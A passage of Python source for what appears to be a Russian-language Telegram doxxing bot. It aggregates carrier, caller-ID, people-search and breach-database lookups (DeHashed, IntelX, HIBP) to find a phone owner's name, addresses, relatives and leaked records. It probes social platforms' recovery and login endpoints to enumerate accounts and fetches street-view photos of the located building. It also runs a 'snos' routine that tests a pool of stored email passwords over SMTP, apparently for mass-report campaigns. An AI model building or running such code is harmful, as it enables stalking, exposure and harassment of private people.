        if r.status_code == 200:
            data = r.json()
            return {"status": data.get("status"), "mccmnc": data.get("mccmnc"),
                    "ported": data.get("ported")}
    except Exception:
        pass
    return {}


def check_twilio(phone):
    if not (TWILIO_SID and TWILIO_TOKEN):
        return {}
    try:
        r = requests.get(TWILIO_URL.format(phone=phone),
                         params={"Fields": "caller_name,line_type_intelligence"},
                         auth=(TWILIO_SID, TWILIO_TOKEN), timeout=10)
        if r.status_code == 200:
            data = r.json()
            lti = data.get("line_type_intelligence", {}) or {}
            return {"valid": data.get("valid"),
                    "caller_name": (data.get("caller_name") or {}).get("caller_name"),
                    "line_type": lti.get("type"),
                    "carrier": lti.get("carrier_name"),
                    "country_code": data.get("country_code")}
    except Exception:
        pass
    return {}


def check_vonage(phone):
    if not (VONAGE_KEY and VONAGE_SECRET):
        return {}
    try:
        r = requests.post(VONAGE_URL,
                          params={"api_key": VONAGE_KEY, "api_secret": VONAGE_SECRET,
                                  "number": phone, "country": "RU", "features": "carrier,type"},
                          timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {"status": data.get("status"), "request_id": data.get("request_id"),
                    "carrier": data.get("carrier"), "type": data.get("type")}
    except Exception:
        pass
    return {}


def check_telesign(phone):
    if not (TELESIGN_ID and TELESIGN_AUTH):
        return {}
    try:
        r = requests.get(TELESIGN_URL.format(phone=phone),
                         auth=(TELESIGN_ID, TELESIGN_AUTH), timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {"phone_type": (data.get("phone_type") or {}).get("description"),
                    "carrier": (data.get("carrier") or {}).get("name"),
                    "country": (data.get("location") or {}).get("country")}
    except Exception:
        pass
    return {}


def check_numlookup(phone):
    if not NUMLOOKUP_KEY:
        return {}
    try:
        r = requests.get(NUMLOOKUP_URL.format(phone=phone),
                         params={"apikey": NUMLOOKUP_KEY}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {"valid": data.get("valid"),
                    "format_international": data.get("format", {}).get("international"),
                    "country": data.get("country"), "location": data.get("location"),
                    "carrier": data.get("carrier"), "type": data.get("type")}
    except Exception:
        pass
    return {}


def check_melissa(phone):
    if not MELISSA_KEY:
        return {}
    try:
        r = requests.get(MELISSA_URL, params={"id": MELISSA_KEY, "phone": phone}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("Records"):
                rec = data["Records"][0]
                return {"carrier": rec.get("CarrierName"),
                        "country": rec.get("CountryName"),
                        "type": rec.get("PhoneType"), "city": rec.get("City")}
    except Exception:
        pass
    return {}


def check_whitepages(phone):
    if not WHITEPAGES_KEY:
        return {}
    try:
        r = requests.get(WHITEPAGES_URL,
                         params={"api_key": WHITEPAGES_KEY, "phone_number": phone},
                         timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {"carrier": data.get("carrier"), "line_type": data.get("line_type"),
                    "is_prepaid": data.get("is_prepaid"),
                    "is_commercial": data.get("is_commercial"),
                    "belongs_to": ", ".join(p.get("name") for p in data.get("belongs_to", [])
                                            if p.get("name"))}
    except Exception:
        pass
    return {}


def check_zaba(phone):
    try:
        r = requests.get(ZABA_URL, params={"phone": phone},
                         headers={"User-Agent": random.choice(OK_USERAGENTS)}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {"name": data.get("name"), "carrier": data.get("carrier"),
                    "location": data.get("location")}
    except Exception:
        pass
    return {}


def check_callapp(phone):
    try:
        r = requests.get(CALLAPP_URL, params={"phone": phone},
                         headers={"User-Agent": random.choice(OK_USERAGENTS)}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {"name": data.get("name"), "tags": data.get("tags"),
                    "spam": data.get("spam")}
    except Exception:
        pass
    return {}


def check_hiya(phone):
    try:
        r = requests.get(HIYA_URL, params={"phone": phone},
                         headers={"User-Agent": random.choice(OK_USERAGENTS)}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {"name": data.get("name"), "spam": data.get("spam"),
                    "fraud": data.get("fraud")}
    except Exception:
        pass
    return {}


def check_mrnumber(phone):
    try:
        r = requests.get(MRNUMBER_URL, params={"phone": phone},
                         headers={"User-Agent": random.choice(OK_USERAGENTS)}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {"name": data.get("name"), "spam_score": data.get("spam_score"),
                    "reports": data.get("reports")}
    except Exception:
        pass
    return {}


def check_shouldianswer(phone):
    try:
        r = requests.get(SHOULD_I_ANSWER_URL, params={"phone": phone},
                         headers={"User-Agent": random.choice(OK_USERAGENTS)}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {"name": data.get("name"), "rating": data.get("rating"),
                    "reports": data.get("reports")}
    except Exception:
        pass
    return {}


def check_tellows(phone):
    try:
        r = requests.get(TELLOWS_URL, params={"q": phone},
                         headers={"User-Agent": random.choice(OK_USERAGENTS)}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {"name": data.get("name"), "rating": data.get("rating"),
                    "reports": data.get("reports")}
    except Exception:
        pass
    return {}


def check_ktozvonil(phone):
    try:
        r = requests.get(KTOZVONIL_URL, params={"phone": phone},
                         headers={"User-Agent": random.choice(OK_USERAGENTS)}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {"name": data.get("name"), "rating": data.get("rating"),
                    "comments": data.get("comments", [])[:5]}
    except Exception:
        pass
    return {}


def check_zvonili(phone):
    try:
        r = requests.get(ZVONILI_URL, params={"phone": phone},
                         headers={"User-Agent": random.choice(OK_USERAGENTS)}, timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {"name": data.get("name"), "rating": data.get("rating"),
                    "category": data.get("category")}
    except Exception:
        pass
    return {}


def check_getipintel(phone):
    try:
        r = requests.get(GETIPINTEL_URL,
                         params={"ip": phone, "format": "json", "contact": "osint@example.com"},
                         timeout=10)
        if r.status_code == 200:
            data = r.json()
            return {"result": data.get("result"), "status": data.get("status")}
    except Exception:
        pass
    return {}


def check_spokeo(phone):
    try:
        r = requests.get(SPOKEO_URL.format(phone=phone),
                         headers={"User-Agent": random.choice(OK_USERAGENTS)},
                         timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("results"):
                return {"found": True, "results": data["results"][:5]}
    except Exception:
        pass
    return {}


def check_whitepages_people(phone):
    if not WHITEPAGES_KEY:
        return {}
    try:
        r = requests.get(WHITEPAGES_PEOPLE_URL,
                         params={"api_key": WHITEPAGES_KEY, "phone": phone},
                         timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("results"):
                return {"found": True, "results": data["results"][:5]}
    except Exception:
        pass
    return {}


def check_beenverified(phone):
    try:
        r = requests.get(BEENVERIFIED_URL,
                         params={"phone": phone},
                         headers={"User-Agent": random.choice(OK_USERAGENTS)},
                         timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("records"):
                return {"found": True, "records": data["records"][:5]}
    except Exception:
        pass
    return {}


def check_radaris(phone):
    try:
        r = requests.get(RADARIS_URL,
                         params={"q": phone},
                         headers={"User-Agent": random.choice(OK_USERAGENTS)},
                         timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("results"):
                return {"found": True, "results": data["results"][:5]}
    except Exception:
        pass
    return {}


def check_intelius(phone):
    try:
        r = requests.get(INTELIUS_URL,
                         params={"phone": phone},
                         headers={"User-Agent": random.choice(OK_USERAGENTS)},
                         timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("results"):
                return {"found": True, "results": data["results"][:5]}
    except Exception:
        pass
    return {}


def check_truthfinder(phone):
    try:
        r = requests.get(TRUTHFINDER_URL,
                         params={"phone": phone},
                         headers={"User-Agent": random.choice(OK_USERAGENTS)},
                         timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("results"):
                return {"found": True, "results": data["results"][:5]}
    except Exception:
        pass
    return {}


def check_fastpeoplesearch(phone):
    try:
        r = requests.get(FASTPEOPLESEARCH_URL,
                         params={"phone": phone},
                         headers={"User-Agent": random.choice(OK_USERAGENTS)},
                         timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("results"):
                return {"found": True, "results": data["results"][:5]}
    except Exception:
        pass
    return {}


def check_truepeoplesearch(phone):
    try:
        r = requests.get(TRUEPEOPLESEARCH_URL,
                         params={"phone": phone},
                         headers={"User-Agent": random.choice(OK_USERAGENTS)},
                         timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("results"):
                return {"found": True, "results": data["results"][:5]}
    except Exception:
        pass
    return {}


def check_peoplefinders(phone):
    try:
        r = requests.get(PEOPLEFINDERS_URL,
                         params={"phone": phone},
                         headers={"User-Agent": random.choice(OK_USERAGENTS)},
                         timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("results"):
                return {"found": True, "results": data["results"][:5]}
    except Exception:
        pass
    return {}


def check_mylife(phone):
    try:
        r = requests.get(MYLIFE_URL,
                         params={"phone": phone},
                         headers={"User-Agent": random.choice(OK_USERAGENTS)},
                         timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("results"):
                return {"found": True, "results": data["results"][:5]}
    except Exception:
        pass
    return {}


def check_hibp_phone(phone):
    try:
        r = requests.get(HIBP_PHONE_URL.format(phone=phone),
                         headers={"User-Agent": "OSINT-Bot/1.0",
                                  "hibp-api-key": os.environ.get("HIBP_KEY", "")},
                         timeout=10)
        if r.status_code == 200:
            return {"breaches": r.json()}
        if r.status_code == 404:
            return {"breaches": []}
    except Exception:
        pass
    return {}


def check_hibp_phone_detailed(phone):
    try:
        key = os.environ.get("HIBP_KEY", "")
        if not key:
            return []
        headers = {"User-Agent": "OSINT-Bot/1.0", "hibp-api-key": key}
        r = requests.get(
            f"https://haveibeenpwned.com/api/v3/breachedaccount/{quote(phone)}",
            headers=headers, timeout=15,
        )
        if r.status_code == 200:
            breaches = r.json()
            result = []
            for b in breaches:
                name = b.get("Name", "")
                result.append({
                    "name": name,
                    "title": b.get("Title", name),
                    "domain": b.get("Domain", ""),
                    "breach_date": b.get("BreachDate", ""),
                    "pwn_count": b.get("PwnCount", 0),
                    "data_classes": b.get("DataClasses", []),
                    "url": f"https://haveibeenpwned.com/PwnedWebsites#{name}",
                })
            return result
        if r.status_code == 404:
            return []
    except Exception as e:
        log(f"[HIBP detailed] error: {e}")
    return []


def check_xposedornot_phone_detailed(phone):
    try:
        from xposedornot import XposedOrNot
        xon = XposedOrNot()
        result = xon.check_email(phone)
        if result.breaches and len(result.breaches) > 0:
            out = []
            for b in result.breaches:
                out.append({
                    "name": b,
                    "url": f"https://xposedornot.com/breach/{b}",
                })
            return out
    except Exception:
        pass
    return []


def check_dehashed(phone):
    key = os.environ.get("DEHASHED_KEY", "")
    if not key:
        return {}
    try:
        r = requests.get(DEHASHED_URL,
                         params={"q": phone},
                         auth=(os.environ.get("DEHASHED_EMAIL", ""), key),
                         timeout=15)
        if r.status_code == 200:
            data = r.json()
            if data.get("entries"):
                return {"entries": data["entries"][:10]}
    except Exception:
        pass
    return {}


def check_intelx_phone(phone):
    key = os.environ.get("INTELX_KEY", "")
    if not key:
        return {}
    try:
        r = requests.get(INTELX_PHONE_URL,
                         params={"term": phone, "maxresults": 10},
                         headers={"x-key": key},
                         timeout=15)
        if r.status_code == 200:
            data = r.json()
            if data.get("records"):
                return {"records": data["records"][:10]}
    except Exception:
        pass
    return {}


def check_ipqs_phone(phone):
    if not IPQS_KEY:
        return {}
    try:
        r = requests.get(IPQUALITYSCORE_PHONE_URL.format(key=IPQS_KEY, phone=phone),
                         timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("success"):
                return data
    except Exception:
        pass
    return {}


def check_hlrlookup(phone):
    try:
        r = requests.get(HLRLOOKUP_URL,
                         params={"phone": phone},
                         headers={"User-Agent": random.choice(OK_USERAGENTS)},
                         timeout=10)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return {}


def check_telesign_phoneid(phone):
    if not (TELESIGN_ID and TELESIGN_AUTH):
        return {}
    try:
        r = requests.get(TELESIGN_PHONEID_URL.format(phone=phone),
                         auth=(TELESIGN_ID, TELESIGN_AUTH),
                         timeout=10)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return {}


def check_vonage_ni(phone):
    if not (VONAGE_KEY and VONAGE_SECRET):
        return {}
    try:
        r = requests.post(VONAGE_NI_URL,
                          params={"api_key": VONAGE_KEY, "api_secret": VONAGE_SECRET,
                                  "number": phone, "country": "RU"},
                          timeout=10)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return {}


def check_twilio_lookup(phone):
    if not (TWILIO_SID and TWILIO_TOKEN):
        return {}
    try:
        r = requests.get(TWILIO_LOOKUP_URL.format(phone=phone),
                         auth=(TWILIO_SID, TWILIO_TOKEN),
                         timeout=10)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return {}


def check_facebook_phone(phone):
    try:
        r = requests.get(FACEBOOK_PHONE_URL.format(phone=phone.lstrip("+")),
                         headers={"User-Agent": random.choice(OK_USERAGENTS)},
                         timeout=10, allow_redirects=True)
        if "recover" in r.url or "identify" in r.url:
            return {"registered": True}
        return {"registered": False}
    except Exception:
        return {}


def check_instagram_phone(phone):
    try:
        r = requests.post(INSTAGRAM_PHONE_URL,
                          data={"phone_number": phone.lstrip("+")},
                          headers={"User-Agent": random.choice(OK_USERAGENTS),
                                   "X-Requested-With": "XMLHttpRequest"},
                          timeout=10)
        if r.status_code == 200:
            return {"registered": True}
        return {"registered": False}
    except Exception:
        return {}


def check_linkedin_phone(phone):
    try:
        r = requests.post(LINKEDIN_PHONE_URL,
                          data={"session_key": phone},
                          headers={"User-Agent": random.choice(OK_USERAGENTS)},
                          timeout=10)
        if r.status_code == 200:
            return {"registered": True}
        return {"registered": False}
    except Exception:
        return {}


def check_snapchat_phone(phone):
    try:
        r = requests.post(SNAPCHAT_PHONE_URL,
                          data={"phone_number": phone.lstrip("+")},
                          headers={"User-Agent": random.choice(OK_USERAGENTS)},
                          timeout=10)
        if r.status_code == 200:
            return {"registered": True}
        return {"registered": False}
    except Exception:
        return {}


def check_tiktok_phone(phone):
    try:
        r = requests.post(TIKTOK_PHONE_URL,
                          data={"mobile": phone.lstrip("+")},
                          headers={"User-Agent": random.choice(OK_USERAGENTS)},
                          timeout=10)
        if r.status_code == 200:
            return {"registered": True}
        return {"registered": False}
    except Exception:
        return {}


def check_twitter_phone(phone):
    try:
        r = requests.post("https://api.twitter.com/1.1/account/verify_credentials.json",
                          data={"phone_number": phone.lstrip("+")},
                          headers={"User-Agent": random.choice(OK_USERAGENTS)},
                          timeout=10)
        if r.status_code == 200:
            return {"registered": True}
        return {"registered": False}
    except Exception:
        return {}


def check_apify_people_search(phone):
    if not APIFY_TOKEN:
        return {}
    try:
        from apify_client import ApifyClient
        client = ApifyClient(APIFY_TOKEN)
        run_input = {"queries": [phone], "maxResults": 1}
        run = client.actor("nabeelbaghoor/people-search-lookup-api").call(run_input=run_input)
        items = list(client.dataset(run.default_dataset_id).iterate_items())
        if items:
            rec = items[0]
            return {
                "fullName": rec.get("fullName"),
                "firstName": rec.get("firstName"),
                "lastName": rec.get("lastName"),
                "age": rec.get("age"),
                "dobMonth": rec.get("dobMonth"),
                "dobYear": rec.get("dobYear"),
                "currentAddress": rec.get("currentAddress"),
                "matchScore": rec.get("matchScore"),
                "phones": rec.get("phones", []),
                "emails": rec.get("emails", []),
                "relatives": rec.get("relatives", []),
            }
    except Exception as e:
        log(f"[Apify] error: {e}")
    return {}


def check_truecaller_py(phone):
    if not TRUECALLER_INSTALLATION_ID:
        return {}
    try:
        import asyncio
        from truecallerpy import search_phonenumber
        response = asyncio.run(search_phonenumber(
            phone, "RU", TRUECALLER_INSTALLATION_ID
        ))
        if response and response.get("data"):
            rec = response["data"][0]
            return {
                "name": rec.get("name"),
                "carrier": rec.get("carrier"),
                "countryCode": rec.get("countryCode"),
                "spam": rec.get("spam"),
                "tags": rec.get("tags"),
            }
    except Exception as e:
        log(f"[TruecallerPy] error: {e}")
    return {}


def check_getcontact_cli(phone):
    if not GETCONTACT_AVAILABLE:
        return {}
    try:
        result = subprocess.run(
            ["python", "gtc.py", "search", phone, "--json"],
            capture_output=True, text=True, timeout=20
        )
        if result.returncode == 0 and result.stdout:
            data = json.loads(result.stdout)
            return {
                "displayName": data.get("displayName"),
                "tags": data.get("tags", []),
                "email": data.get("email"),
            }
    except Exception as e:
        log(f"[GetContact CLI] error: {e}")
    return {}


def check_neutralino(phone):
    if not (NEUTRALINO_USER and NEUTRALINO_KEY):
        return {}
    try:
        r = requests.post(NEUTRALINO_URL,
                          headers={"User-ID": NEUTRALINO_USER, "API-Key": NEUTRALINO_KEY},
                          data={"number": phone, "country-code": "RU"},
                          timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("valid"):
                return {
                    "valid": data.get("valid"),
                    "country": data.get("country"),
                    "location": data.get("location"),
                    "carrier": data.get("carrier"),
                    "type": data.get("type"),
                    "international": data.get("international-number"),
                }
    except Exception:
        pass
    return {}


def check_telnyx(phone):
    if not TELNYX_KEY:
        return {}
    try:
        r = requests.get(TELNYX_PHONE_URL.format(phone=phone),
                         headers={"Authorization": f"Bearer {TELNYX_KEY}"},
                         timeout=10)
        if r.status_code == 200:
            data = r.json()
            if data.get("data"):
                return data["data"]
    except Exception:
        pass
    return {}


def check_signalwire(phone):
    if not (SIGNALWIRE_PROJECT and SIGNALWIRE_TOKEN):
        return {}
    try:
        r = requests.get(SIGNALWIRE_URL,
                         params={"phone_number": phone},
                         auth=(SIGNALWIRE_PROJECT, SIGNALWIRE_TOKEN),
                         timeout=10)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return {}


def check_bandwidth(phone):
    if not (BANDWIDTH_ACCOUNT and BANDWIDTH_USER and BANDWIDTH_TOKEN):
        return {}
    try:
        r = requests.get(
            BANDWIDTH_URL.format(account=BANDWIDTH_ACCOUNT, phone=phone),
            auth=(BANDWIDTH_USER, BANDWIDTH_TOKEN), timeout=10)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return {}


def check_plivo(phone):
    if not (PLIVO_AUTH_ID and PLIVO_AUTH_TOKEN):
        return {}
    try:
        r = requests.get(
            PLIVO_URL.format(auth_id=PLIVO_AUTH_ID, phone=phone),
            auth=(PLIVO_AUTH_ID, PLIVO_AUTH_TOKEN), timeout=10)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return {}


def check_commio(phone):
    if not (COMMIO_USER and COMMIO_TOKEN):
        return {}
    try:
        r = requests.get(COMMIO_URL.format(phone=phone),
                         headers={"Authorization": f"Bearer {COMMIO_TOKEN}",
                                  "X-User": COMMIO_USER},
                         timeout=10)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return {}


# ================== НОВЫЕ LIVE-ИСТОЧНИКИ ==================
def check_apify_truepeoplesearch(query, is_phone=True):
    """TruePeopleSearch через Apify."""
    if not APIFY_TOKEN:
        return {}
    try:
        from apify_client import ApifyClient
        client = ApifyClient(APIFY_TOKEN)
        if is_phone:
            run_input = {
                "searchMode": "phone",
                "phone": query.replace("+", "").replace("-", "").replace(" ", ""),
                "maxItems": 3,
                "detailed": True,
            }
        else:
            parts = query.split()
            run_input = {
                "searchMode": "name",
                "firstName": parts[0] if parts else "",
                "lastName": parts[1] if len(parts) > 1 else "",
                "maxItems": 3,
                "detailed": True,
            }
        run = client.actor(TRUEPEOPLESEARCH_APIFY_ACTOR).call(run_input=run_input)
        items = list(client.dataset(run.default_dataset_id).iterate_items())
        if items:
            rec = items[0]
            return {
                "name": rec.get("name"),
                "age": rec.get("age"),
                "addresses": rec.get("addresses", [])[:3],
                "phones": rec.get("phones", [])[:5],
                "emails": rec.get("emails", [])[:5],
                "relatives": rec.get("relatives", [])[:5],
            }
    except Exception as e:
        log(f"[Apify TPS] error: {e}")
    return {}


def check_apify_phone_enrichment(phone):
    """Phone Enrichment через Apify."""
    if not APIFY_TOKEN:
        return {}
    try:
        from apify_client import ApifyClient
        client = ApifyClient(APIFY_TOKEN)
        run_input = {"phoneNumbers": [phone]}
        run = client.actor(PHONE_ENRICHMENT_APIFY_ACTOR).call(run_input=run_input)
        items = list(client.dataset(run.default_dataset_id).iterate_items())
        if items:
            rec = items[0]
            return {
                "valid": rec.get("valid"),
                "carrier": rec.get("carrier"),
                "line_type": rec.get("lineType"),
                "location": rec.get("location"),
                "owner_name": rec.get("ownerName"),
                "owner_addresses": rec.get("ownerAddresses", [])[:3],
            }
    except Exception as e:
        log(f"[Apify PhoneEnrich] error: {e}")
    return {}


def check_numlookupapi(phone, country_code="RU"):
    """NumLookupAPI — валидатор."""
    if not NUMOOKUP_API_KEY:
        return {}
    try:
        r = requests.get(
            f"https://api.numlookupapi.com/v1/validate/{phone}",
            params={"apikey": NUMOOKUP_API_KEY, "country_code": country_code},
            timeout=10,
        )
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return {}


def check_thatsthem(phone):
    """That'sThem — US reverse phone lookup (парсинг)."""
    if not THATSTHEM_ENABLED:
        return {}
    try:
        digits = re.sub(r"\D", "", phone)
        if len(digits) == 11 and digits.startswith("7"):
            return {}
        r = requests.get(
            f"https://thatsthem.com/phone/{digits}",
            headers={"User-Agent": random.choice(OK_USERAGENTS)},
            timeout=12,
        )
        if r.status_code == 200:
            soup = BeautifulSoup(r.text, "html.parser")
            name_tag = soup.find("h1", class_="name")
            if name_tag:
                return {"name": name_tag.get_text(strip=True)}
    except Exception:
        pass
    return {}


# ================== ФОТО ЗДАНИЯ ==================
def get_building_photo_streetview(lat, lon, api_key=None):
    key = api_key or GOOGLE_STREETVIEW_KEY
    if not key:
        return None
    try:
        url = (
            f"https://maps.googleapis.com/maps/api/streetview?"
            f"size=600x400&location={lat},{lon}&fov=80&pitch=10&key={key}"
        )
        return url
    except Exception:
        return None


def get_building_photo_yandex(lat, lon):
    if STREETLEVEL_AVAILABLE:
        try:
            pano = yandex_pano.find_panorama(lat, lon)
            if pano:
                return f"https://yandex.ru/maps/?panorama%5Bpoint%5D={lon}%2C{lat}&panorama%5Bdirection%5D=0%2C0&panorama%5Bspan%5D=180%2C90"
        except Exception as e:
            log(f"[YandexPano streetlevel] error: {e}")
    return f"https://yandex.ru/maps/?panorama%5Bpoint%5D={lon}%2C{lat}&panorama%5Bdirection%5D=0%2C0&panorama%5Bspan%5D=180%2C90"


def send_building_photo(chat_id, lat, lon, caption="📸 Примерное фото здания"):
    url = get_building_photo_streetview(lat, lon)
    if url:
        try:
            img_resp = requests.get(url, timeout=15)
            if img_resp.status_code == 200 and len(img_resp.content) > 5000:
                bot.send_photo(chat_id, img_resp.content, caption=caption)
                return True
        except Exception:
            pass

    yandex_url = get_building_photo_yandex(lat, lon)
    if yandex_url:
        try:
            bot.send_message(
                chat_id,
                f"📸 <b>Панорама Яндекс.Карт:</b>\n<a href='{yandex_url}'>Открыть вид на здание</a>",
                parse_mode="HTML",
                disable_web_page_preview=False,
            )
            return True
        except Exception:
            pass

    fallback_url = f"https://www.google.com/maps/@?api=1&map_action=pano&viewpoint={lat},{lon}"
    try:
        bot.send_message(
            chat_id,
            f"📸 <b>Примерный вид:</b>\n<a href='{fallback_url}'>Открыть Street View в Google Maps</a>",
            parse_mode="HTML",
            disable_web_page_preview=False,
        )
        return True
    except Exception:
        return False


def check_vk_public_phone(vk_url):
    try:
        if "vk.com/" not in vk_url and "vkontakte.ru/" not in vk_url:
            return {}
        r = requests.get(
            vk_url,
            headers={"User-Agent": random.choice(OK_USERAGENTS)},
            timeout=15, allow_redirects=True,
        )
        if r.status_code != 200:
            return {}
        soup = BeautifulSoup(r.text, "html.parser")
        phone_re = re.compile(r"\+?7[\s\-\(\)]*\d{3}[\s\-\(\)]*\d{3}[\s\-\(\)]*\d{2}[\s\-\(\)]*\d{2}")
        found = []
        for text in soup.stripped_strings:
            for m in phone_re.findall(text):
                norm = normalize_phone(m)
                if len(norm) == 11 and norm not in found:
                    found.append(norm)
        if found:
            return {"public_phones": found[:5], "source_url": vk_url}
    except Exception as e:
        log(f"[VK public] error: {e}")
    return {}


def load_sherlock_sites():
    global _sherlock_cache
    now = time.time()
    if _sherlock_cache["sites"] and now - _sherlock_cache["ts"] < 86400:
        return _sherlock_cache["sites"]
    try:
        r = requests.get(SHERLOCK_MANIFEST_URL, headers={"User-Agent": "OSINT-Bot/1.0"}, timeout=20)
        if r.status_code == 200:
            data = r.json()
            if isinstance(data, dict):
                _sherlock_cache["sites"] = data
                _sherlock_cache["ts"] = now
                log(f"[Sherlock] Загружено сайтов: {len(data)}")
                return data
    except Exception as e:
        log(f"[Sherlock] manifest error: {e}")
    _sherlock_cache["sites"] = SHERLOCK_FALLBACK_SITES
    _sherlock_cache["ts"] = now
    return SHERLOCK_FALLBACK_SITES


def check_sherlock_username(username):
    sites = load_sherlock_sites()
    if not sites:
        return []
    username = username.strip().lstrip("@")
    if not re.fullmatch(r"[A-Za-z0-9_.\-]{1,64}", username):
        return []
    found = []
    headers = {"User-Agent": random.choice(OK_USERAGENTS)}
    max_sites = int(os.environ.get("SHERLOCK_MAX_SITES", "80"))
    items = list(sites.items())[:max_sites]
    for name, cfg in items:
        try:
            url_tpl = cfg.get("url")
            if not url_tpl or "{}" not in url_tpl:
                continue
            error_type = cfg.get("errorType", "status_code")
            target = url_tpl.replace("{}", username)
            r = requests.get(target, headers=headers, timeout=8, allow_redirects=True)
            claimed = False
            if error_type == "status_code":
                claimed = (r.status_code == 200)
            elif error_type == "message":
                err_msg = cfg.get("errorMsg")
                if isinstance(err_msg, str):
                    claimed = (r.status_code == 200 and err_msg.lower() not in r.text.lower())
                elif isinstance(err_msg, list):
                    claimed = (r.status_code == 200 and all(m.lower() not in r.text.lower() for m in err_msg))
            elif error_type == "response_url":
                err_url = cfg.get("errorUrl", "")
                claimed = (r.status_code == 200 and (not err_url or err_url not in r.url))
            if claimed:
                found.append({"site": name, "url": target, "status": r.status_code})
        except Exception:
            continue
    return found


def snos_check_senders(chat_id):
    senders_pool = list(SNOS_SENDERS.items())
    total = len(senders_pool)
    status = bot.send_message(
        chat_id,
        f"🔍 <b>Проверка отправителей</b>\nВсего: {total}\nПроверяю...",
        parse_mode="HTML",
    )
    ok_list, fail_list = [], []
    for i, (email_, pwd) in enumerate(senders_pool, 1):
        host, port, use_ssl = get_smtp_for(email_)
        ok, err = False, None
        try:
            if use_ssl:
                server = smtplib.SMTP_SSL(host, port, timeout=15)
            else:
                server = smtplib.SMTP(host, port, timeout=15)
                server.ehlo()
                server.starttls()
                server.ehlo()
            server.login(email_, pwd)
            server.quit()
            ok = True
        except smtplib.SMTPAuthenticationError:
            err = "auth_failed"
        except smtplib.SMTPServerDisconnected:
            err = "disconnected"
        except Exception as e:
            err = str(e)[:80]
        if ok:
            ok_list.append(email_)
        else:
            fail_list.append((email_, host, err))
        if i % 5 == 0 or i == total:
            try:
                bot.edit_message_text(
                    f"🔍 <b>Проверка отправителей</b>\n"
                    f"Прогресс: {i}/{total}\n"
                    f"✅ Живых: {len(ok_list)}\n"
                    f"❌ Мёртвых: {len(fail_list)}",
                    chat_id, status.message_id, parse_mode="HTML",
                )
            except Exception:
                pass
    text = (
        f"📊 <b>Результат проверки отправителей</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>Живых ({len(ok_list)}):</b>\n"
    )
    if ok_list:
        for e in ok_list[:50]:
            text += f"  • <code>{e}</code>\n"
    else:
        text += "  —\n"
    text += f"\n❌ <b>Мёртвых ({len(fail_list)}):</b>\n"
    for e, h, err in fail_list[:50]:
        text += f"  • <code>{e}</code> — {h} → <i>{err}</i>\n"
    if len(text) > 4000:
        text = text[:3900] + "\n<i>... обрезано</i>"
    try:
        bot.send_message(chat_id, text, parse_mode="HTML")
    except Exception:
        pass

# ================== GITHUB ==================
GITHUB_API_BASE = f"https://api.github.com/repos/{GITHUB_USER}/{GITHUB_REPO}/contents"
GITHUB_RAW_BASE = f"https://raw.githubusercontent.com/{GITHUB_USER}/{GITHUB_REPO}/{GITHUB_BRANCH}"


def get_github_files():
    log("[GitHub] Запрашиваю список файлов...")
    try:
        r = requests.get(f"{GITHUB_API_BASE}?ref={GITHUB_BRANCH}",
                         headers={"User-Agent": "OSINT-Bot/1.0"}, timeout=30)
        if r.status_code == 200:
            files = r.json()
            if isinstance(files, list):
                return [f["name"] for f in files if f.get("type") == "file"]
    except Exception as e:
        log(f"[GitHub] Ошибка API: {e}")
    log("[GitHub] API не сработал, парсю HTML страницы...")
    try:
        r = requests.get(f"https://github.com/{GITHUB_USER}/{GITHUB_REPO}",
                         headers={"User-Agent": "Mozilla/5.0"}, timeout=30)
        if r.status_code == 200:
            soup = BeautifulSoup(r.text, "html.parser")
            files = []
            for a in soup.find_all("a", href=True):
                href = a["href"]
                if f"/{GITHUB_USER}/{GITHUB_REPO}/blob/{GITHUB_BRANCH}/" in href:
                    filename = href.split("/")[-1]
                    if filename and "." in filename:
                        files.append(filename)
            if files:
                return list(set(files))
    except Exception as e:
        log(f"[GitHub] Ошибка HTML-парсинга: {e}")
    return []


def download_file_from_github(filename):
    local_path = os.path.join(DB_DIR, filename)
    url = f"{GITHUB_RAW_BASE}/{quote(filename)}"
    try:
        headers = {"User-Agent": "OSINT-Bot/1.0"}
        need_download = True
        if os.path.exists(local_path):
            try:
                head = requests.head(url, headers=headers, timeout=10, allow_redirects=True)
                if head.status_code == 200:
                    remote_size = int(head.headers.get("Content-Length", 0))
                    if remote_size and os.path.getsize(local_path) == remote_size:
                        need_download = False
            except Exception:
                pass
        if need_download:
            log(f"[GitHub] Скачиваю {filename} ...")
            r = requests.get(url, headers=headers, timeout=600, stream=True)
            r.raise_for_status()
            tmp = local_path + ".part"
            with open(tmp, "wb") as f:
                for chunk in r.iter_content(chunk_size=1 << 20):
                    if chunk:
                        f.write(chunk)
            os.replace(tmp, local_path)
